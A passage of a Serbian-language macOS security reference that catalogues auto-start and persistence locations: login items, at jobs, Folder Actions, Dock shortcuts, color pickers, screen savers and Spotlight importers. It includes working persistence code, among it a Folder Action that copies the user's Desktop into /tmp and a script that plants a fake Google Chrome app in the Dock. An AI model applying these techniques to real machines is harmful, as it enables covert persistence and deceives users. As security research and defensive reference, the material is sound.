#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` je detalj implementacije, a ne podržana lokacija za instaliranje payload-a jednostavnim upisivanjem datoteke. Stariji API `SMLoginItemSetEnabled` zamenjen je API-jem `SMAppService` za nove pomoćne programe; putanja `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, koja se ranije navodila na ovoj stranici, nije postojala na testnoj mašini sa macOS 26.5.2. Pri proceni modernih login item-a koristite API za registraciju i stanje sistemskog korisničkog interfejsa, a ne pretpostavljenu putanju do baze podataka.

### ZIP kao Login Item

(Pogledajte prethodni odeljak o Login Item-ima, ovo je proširenje.)

Ako sačuvate **ZIP** datoteku kao **Login Item**, **`Archive Utility`** će je otvoriti. Ako je, na primer, ZIP sačuvan u **`~/Library`** i sadrži fasciklu **`LaunchAgents/file.plist`** sa backdoor-om, ta fascikla će biti napravljena (ne postoji podrazumevano), a plist će biti dodat. Sledeći put kada se korisnik ponovo prijavi, **backdoor naveden u plist-u biće izvršen**.

Druga mogućnost je da napravite datoteke **`.bash_profile`** i **`.zshenv`** u korisničkom HOME direktorijumu, tako da ova tehnika i dalje radi ako fascikla LaunchAgents već postoji.

### At

Opis: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate **izvršiti** **`at`** i mora biti **omogućen**
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Morate **izvršiti** **`at`** i mora biti **omogućen**

#### **Opis**

Zadaci `at` služe za **zakazivanje jednokratnih zadataka** koji će se izvršiti u određeno vreme. Za razliku od cron poslova, zadaci `at` se automatski uklanjaju nakon izvršavanja. Važno je napomenuti da se ovi zadaci zadržavaju nakon ponovnog pokretanja sistema, što ih u određenim uslovima čini potencijalnim bezbednosnim rizikom.<sup>[[16]](#references)</sup>

U paketu `com.apple.atrun.plist` nalazi se `Disabled = true`, ali launchd zasebno čuva efektivne zamene za stanje omogućenosti/onemogućenosti. Na testnoj mašini sa macOS 26.5.2, komanda `launchctl print-disabled system` prijavila je `com.apple.atrun` kao **omogućen**, uprkos tom ključu u paketu. Pre nego što tvrdite da će se zadaci `at` izvršavati, proverite efektivno stanje:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Administrator može da omogući onemogućenu uslugu `atrun` pomoću komande `launchctl`; sledeći istorijski primer menja stanje sistemske usluge i **nije pokrenut** na Mac računaru korišćenom za istraživanje:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Ovo će kreirati datoteku za 1 sat:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Proverite red poslova pomoću `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Iznad možemo da vidimo dva zakazana posla. Detalje posla možemo da ispišemo pomoću `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Ako AT tasks nisu omogućeni, kreirani zadaci neće biti izvršeni.

**Datoteke zadataka** nalaze se u `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Ime datoteke sadrži red čekanja, broj zadatka i vreme kada je zakazano njegovo pokretanje. Na primer, pogledajmo `a0001a019bdcd2`.

- `a` - ovo je red čekanja
- `0001a` - broj zadatka u heksadecimalnom zapisu, `0x1a = 26`
- `019bdcd2` - vreme u heksadecimalnom zapisu. Predstavlja broj minuta proteklih od epohe. `0x019bdcd2` je `26991826` u decimalnom zapisu. Ako ga pomnožimo sa 60, dobijamo `1619509560`, što je `GMT: 2021. April 27., Tuesday 7:46:00`.

Ako ispišemo datoteku zadatka, videćemo da sadrži iste informacije koje smo dobili pomoću `at -c`.

### Obaveštenja Calendar-a o otvaranju datoteke

- **Cilj upisa:** Izvršni paket aplikacije ili druga datoteka **koja je već izabrana** u prilagođenom obaveštenju **Open file** za događaj u Calendar-u. Kreiranje ili uređivanje samog obaveštenja zahteva pristup tom događaju u kalendaru kroz Calendar ili prihvaćeni izvor podataka kalendara; nasumični upis u datoteku ne kreira obaveštenje.
- **Okidač:** Zakazano vreme obaveštenja na Mac-u na kojem Calendar obrađuje događaj. Ponavljajući događaj može ponavljati radnju. [Aktuelno uputstvo Apple-a za Calendar](https://support.apple.com/guide/calendar/icl1012/mac) potvrđuje opciju obaveštenja **Custom → Open file** u macOS 26.
- **Identitet izvršavanja i ograničenja:** Calendar otvara izabranu datoteku za prijavljenog korisnika pomoću povezane aplikacije. Pokretanje paketa aplikacije može izvršiti njegov kod kao taj korisnik, uz ograničenja koja nameću Gatekeeper, karantin i druge macOS provere. Obična skriptna datoteka može se samo otvoriti u uređivaču; njena ekstenzija sama po sebi ne dokazuje izvršavanje koda.

Da biste bezbedno procenili potencijalnu metu, pregledajte obaveštenje događaja u Calendar-u i dozvole izabrane datoteke. Ovaj put je dokumentovan na osnovu Apple-ovog uputstva i **nije** testiran na istraživačkom Mac-u, jer bi testiranje izmenilo aktivni kalendar i zahtevalo čekanje na događaj na desktopu. Testiranje u privremenom nalogu može da izabere aplikacijski paket koji samo kreira marker, podesi obaveštenje Open file za blisku budućnost, potvrdi pokretanje, a zatim obriše događaj i aplikaciju.

### Automatizacije Shortcuts-a u macOS-u

- **Cilj upisa:** Izvršna datoteka **na koju već upućuje** radnja prečice ili postojeća prečica koju ovlašćeni korisnik može da izmeni. Nasumična datoteka `.shortcut` ili upis u nedokumentovanu bazu podataka Shortcuts-a nisu podržan način registrovanja automatizacije.
- **Okidač i identitet:** Prethodno konfigurisani i omogućeni događaj automatizacije, kao što su određeno doba dana ili događaj u aplikaciji, pokreće prečicu za prijavljenog korisnika. [Aktuelno Apple-ovo uputstvo za automatizaciju na Mac-u](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) navodi podržane događaje, objašnjava kada automatizacija može da se pokrene bez potvrde i opisuje uklanjanje okidača. [Apple-ovo uputstvo o privatnosti u Shortcuts-u](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) zahteva **Allow Running Scripts** za skriptne radnje, a pojedinačne radnje i dalje mogu tražiti dozvole.

Ovo je uslovni put od upisa do izvršavanja **samo kada postojeća radnja učitava cilj u koji može da se upisuje**. Kreiranje nove automatizacije kroz korisnički interfejs menja aktivna podešavanja i nije pokušano na istraživačkom Mac-u. U privremenom nalogu vlasnik može da konfiguriše prečicu za određeno doba dana čija skripta dodirne `/tmp/ht-shortcuts-marker`, omogući potrebne dozvole, proveri marker nakon događaja, a zatim izbriše automatizaciju, prečicu i marker.

### Radnje Automator-a i Quick Actions

- **Ciljevi upisa:** `~/Library/Automator/*.action` (korisnik) i `/Library/Automator/*.action` (administrator) za pakete radnji. Sačuvani tok rada Quick Action obično se nalazi u `~/Library/Services/*.workflow`; proverite stvarnu putanju toka rada koju je izabrao korisnik. [Apple-ova referenca za Automator framework](https://developer.apple.com/documentation/automator) navodi direktorijume za pretragu radnji.
- **Okidač:** Automator učitava dostupne pakete radnji prilikom pokretanja, ali zadatak radnje se izvršava kada se pokrene tok rada koji je koristi. Quick Action се покреће када је корисник изабере у Finder-у, Services-у или другом доступном менију. Ток рада Folder Action покреће се када се ставке додају у његову **већ повезану** фасциклу, а ток рада Calendar Alarm покреће се у време његовог догађаја. [Apple-ови типови токова рада](https://support.apple.com/guide/automator/aut7cac58839/mac) разликују ове догађаје. Сам упис радње или тока рада не повезује фасциклу нити заказује догађај у календару.
- **Идентитет извршавања и ограничења:** Налог који покреће ток рада; Automator или апликација која га позива морају да учитају радњу, а тренутне провере потписивања кода и приватности морају то да дозволе. Радња у коју може да се уписује и на коју већ упућује активни ток рада представља другачији случај од инсталирања нове радње и чекања да буде изабрана.

Директоријуми корисника `Automator` и `Services` били су присутни на тестном Mac-у са macOS 26.5.2; `/Library/Automator` није постојао. Ниједан активни ток рада није креиран, повезан нити покренут. Користите привремени налог и радњу/ток рада који само креира маркер да бисте проверили конкретну путању учитавања. Одвојени одељак [Folder Actions](#folder-actions) детаљније описује тај извор догађаја.

### Folder Actions

Опис: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Корисно за заобилажење sandbox-а: [✅](https://emojipedia.org/check-mark-button)
  - Али морате моћи да позовете `osascript` са аргументима за контактирање **`System Events`** како бисте могли да конфигуришете Folder Actions
- Заобилажење TCC-а: [🟠](https://emojipedia.org/large-orange-circle)
  - Има неке основне TCC дозволе, као што су Desktop, Documents и Downloads

#### Локација

- **`/Library/Scripts/Folder Action Scripts`**
  - Потребан је root приступ
  - **Окидач**: Приступ наведеној фасцикли
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Окидач**: Приступ наведеној фасцикли

#### Опис и експлоатација

Folder Actions су скрипте које се аутоматски покрећу услед промена у фасцикли, као што су додавање или уклањање ставки, или других радњи попут отварања или промене величине прозора фасцикле. Ове радње могу се користити за различите задатке и могу се покренути на различите начине, као што су кориснички интерфејс Finder-а или команде терминала.<sup>[[17]](#references)[[18]](#references)</sup>

За подешавање Folder Actions-а можете, на пример:

1. Направити ток рада Folder Action помоћу [Automator-а](https://support.apple.com/guide/automator/welcome/mac) и инсталирати га као услугу.
2. Ручно прикључити скрипту помоћу Folder Actions Setup-а у контекстном менију фасцикле.
3. Користити OSAScript за слање Apple Event порука апликацији `System Events.app` како би се програмски подесио Folder Action.
   - Овај метод је посебно користан за уграђивање радње у систем, чиме се постиже одређени ниво постојаности.

Следећа скрипта је пример онога што Folder Action може да изврши:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Da biste gorenavedenu skriptu mogli da koristite putem Folder Actions, kompajlirajte je koristeći:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nakon što se skripta kompajlira, podesite Folder Actions tako što ćete izvršiti skriptu ispod. Ova skripta će globalno omogućiti Folder Actions i posebno prikačiti prethodno kompajliranu skriptu na folder Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Pokrenite skriptu za podešavanje komandom:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Ovo je način da implementirate ovu postojanost putem GUI-ja:

Ovo je skripta koja će biti izvršena:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompajlirajte ga pomoću: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite ga u:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Zatim otvorite aplikaciju `Folder Actions Setup`, izaberite **folder koji želite da nadgledate**, a zatim u vašem slučaju izaberite **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder pomoću **Finder-a**, vaša skripta će se izvršiti.

Ova konfiguracija je bila sačuvana u **plist** datoteci koja se nalazi na putanji **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, u base64 formatu.

Sada pokušajmo da pripremimo ovu postojanost bez pristupa GUI-ju:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` kao rezervnu kopiju:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo podesili:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo prazno okruženje:

3. Kopirajte rezervnu kopiju: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da bi učitala ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Meni ovo nije uspelo, ali ovo su uputstva iz writeup-a:(

### Dock prečice

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate imati instaliranu zlonamernu aplikaciju unutar sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `~/Library/Preferences/com.apple.dock.plist`
  - **Okidač**: Kada korisnik klikne na aplikaciju u dock-u

#### Opis i eksploatacija

Sve aplikacije koje se pojavljuju u Dock-u navedene su u plist datoteci: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Moguće je **dodati aplikaciju** samo pomoću:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Koristeći malo **social engineering** tehnika, mogli biste da se lažno predstavite kao, na primer, Google Chrome u dock-u i zapravo izvršite sopstvenu skriptu:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metodi unosa

- **Ciljno mesto upisa:** Bundle aplikacije za metod unosa koji sadrži kod, instaliran u `~/Library/Input Methods/` (korisnik) ili `/Library/Input Methods/` (administrator). Ovo se razlikuje od Apple-ovih običnih tekstualnih datoteka za mapiranje tastature `.inputplugin`, koje same po sebi nisu payload sa proizvoljnim kodom.
- **Okidač:** Korisnik dodaje/omogućava izvor unosa u **System Settings → Keyboard → Text Input**, a zatim ga bira ili koristi. Samo kopiranje bundle-a u direktorijum ne dokazuje da će ga macOS pokrenuti. [Apple-ov aktuelni vodič za izvore unosa](https://support.apple.com/guide/mac-help/mchl84525d76/mac) opisuje omogućavanje i menjanje izvora; [Apple-ova dokumentacija za InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) obuhvata metode unosa koji sadrže kod.
- **Identitet izvršavanja i uslovi:** Metod se izvršava kao prijavljeni korisnik, uz uslove registracije metoda unosa, potpisivanja koda i aktuelnih bezbednosnih provera macOS-a. Za postojeće omogućene metode sa izvršnom datotekom u koju može da se upisuje potrebna je zasebna provera putanje i potpisa.

Apple-ова [старија белешка о методима уноса трећих страна](https://developer.apple.com/library/archive/qa/qa1810/_index.html) већ је упозоравала да копирање одређених метода палете у ове директоријуме неће учинити да се они појаве у Input Sources. На истраживачком Mac-у са macOS 26.5.2, кориснички директоријум постоји, али ниједан bundle није инсталиран нити активиран, па је ово документована условна путања, а не локално потврђен резултат извршавања.

### Бирачи боја

Опис: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Корисно за заобилажење sandbox-а: [🟠](https://emojipedia.org/large-orange-circle)
  - Мора да се деси врло специфична радња
  - Завршићете у другом sandbox-у
- Заобилажење TCC-а: [🔴](https://emojipedia.org/large-red-circle)

#### Локација

- `/Library/ColorPickers`
  - Потребан је root
  - Окидач: Користите бирач боја
- `~/Library/ColorPickers`
  - Окидач: Користите бирач боја

#### Опис и експлоатација

**Компилирајте** bundle бирача боја са својим кодом (можете, на пример, да користите [**овај**](https://github.com/viktorstrate/color-picker-plus)), додајте конструктор (као у одељку [Screen Saver](macos-auto-start-locations.md#screen-saver)) и копирајте bundle у `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Затим, када се активира бирач боја, требало би да се изврши и ваш bundle.

Ово зависи од тога да компатибилна апликација отвори системски панел за боје и изабере инсталирани бирач. [Apple-ов водич за панел за боје](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) описује застареле локације bundle-ова. Локална провера путање пронашла је застарели XPC сервис за бирач боја, али на истраживачком Mac-у ниједан бирач није био инсталиран нити учитан; само на основу путање немојте закључивати да је TCC заобиђен.

Имајте на уму да бинарна датотека која учитава вашу библиотеку има **веома рестриктиван sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: **Ne, jer morate da izvršite sopstvenu aplikaciju**
- Zaobilaženje TCC-a: Zavisi od sandbox-a i dozvola omogućene ekstenzije; nije utvrđeno opšte zaobilaženje.

#### Lokacija

- Određena aplikacija

#### Opis i eksploatacija

Primer aplikacije sa Finder Sync Extension [**možete pronaći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu da imaju `Finder Sync Extensions`. Ova ekstenzija se nalazi unutar aplikacije koja će biti izvršena. Štaviše, da bi ekstenzija mogla da izvršava svoj kod, **mora biti potpisana** važećim Apple developerskim sertifikatom, mora biti **sandboxed** (mada se mogu dodati blaži izuzeci) i mora biti registrovana pomoću nečega poput:<sup>[[21]](#references)[[22]](#references)</sup>

Instalirana ekstenzija takođe mora biti **omogućena** i pozvana za relevantnu Finder lokaciju ili stavku; upisivanje proizvoljnog `.appex` paketa nije dovoljno. [Finder Sync API kompanije Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) omogućava proveru stanja omogućenosti. Naredbe `pluginkit` u nastavku prikazuju eksplicitnu registraciju i omogućavanje, a ne automatsko pokretanje samo na osnovu datoteke. Ovaj pristup je proveren pregledom dokumentacije, bez instaliranja ili omogućavanja nove ekstenzije na Mac računaru za istraživanje.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali ćete završiti u uobičajenom sandbox-u aplikacije
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/System/Library/Screen Savers`
  - Potreban je root
  - **Okidač**: Izaberite čuvar ekrana
- `/Library/Screen Savers`
  - Potreban je root
  - **Okidač**: Izaberite čuvar ekrana
- `~/Library/Screen Savers`
  - **Okidač**: Izaberite čuvar ekrana

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i eksploatacija

Kreirajte novi projekat u Xcode-u i izaberite šablon za generisanje novog **Screen Saver**-a. Zatim dodajte svoj kod, na primer, sledeći kod za generisanje logova.<sup>[[23]](#references)[[24]](#references)</sup>

Izvršite **Build** i kopirajte `.saver` bundle u **`~/Library/Screen Savers`**. Zatim otvorite GUI za Screen Saver i samo kliknite na njega — trebalo bi da generiše mnogo logova:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Imajte na umu da ćete, pošto se među entitlements binarne datoteke koja učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) nalazi **`com.apple.security.app-sandbox`**, biti **unutar uobičajenog sandboxa aplikacije**.

Kod čuvara ekrana:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight dodaci

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali završićete u sandboxu aplikacije
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox deluje veoma ograničeno

#### Lokacija

- `~/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
- `/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potreban je root
- `/System/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potreban je root
- `Some.app/Contents/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potrebna je nova aplikacija

#### Opis i eksploatacija

Spotlight je ugrađena funkcija za pretragu u macOS-u, osmišljena da korisnicima omogući **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi omogućio ovu brzu pretragu, Spotlight održava **vlasničku bazu podataka** i pravi indeks tako što **analizira većinu datoteka**, čime omogućava brzo pretraživanje naziva datoteka i njihovog sadržaja.<sup>[[25]](#references)</sup>

Osnovni mehanizam Spotlighta obuhvata centralni proces pod nazivom „mds“, što je skraćenica za **„metadata server“.** Uz njega radi više „mdworker“ demona koji obavljaju razne zadatke održavanja, kao što je indeksiranje različitih tipova datoteka (`ps -ef | grep mdworker`). Ovi zadaci se obavljaju pomoću Spotlight importer dodataka, odnosno **“.mdimporter bundles**“, koji omogućavaju Spotlightu da razume i indeksira sadržaj u raznim formatima datoteka.

Dodaci, odnosno **`.mdimporter`** bundles, nalaze se na prethodno navedenim lokacijama. Novi bundle mora biti otkriven i mora odgovarati tipu datoteke, a Spotlight mora zaista da indeksira odgovarajuću datoteku; samo kopiranje bundlea ne dokazuje da je učitan. [Apple-ova referenca za MDImporter](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) povezuje učitavanje sa datotekom koja ispunjava uslove i koja je izmenjena. Ovde nije testirano izvršavanje Spotlight importera na macOS 26.

Moguće je **pronaći sve učitane `mdimporters`** pokretanjem:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

I, na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih vrsta datoteka (između ostalih, ekstenzija `.iba` i `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Ako proverite Plist drugog `mdimporter` dodatka, možda nećete pronaći stavku **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) — jedinstveni identifikator tipa) i ne mora da navodi ekstenzije.
>
> Pored toga, podrazumevani sistemski dodaci uvek imaju prednost, pa napadač može da pristupi samo datotekama koje Apple-ovi `mdimporters` dodaci ne indeksiraju.

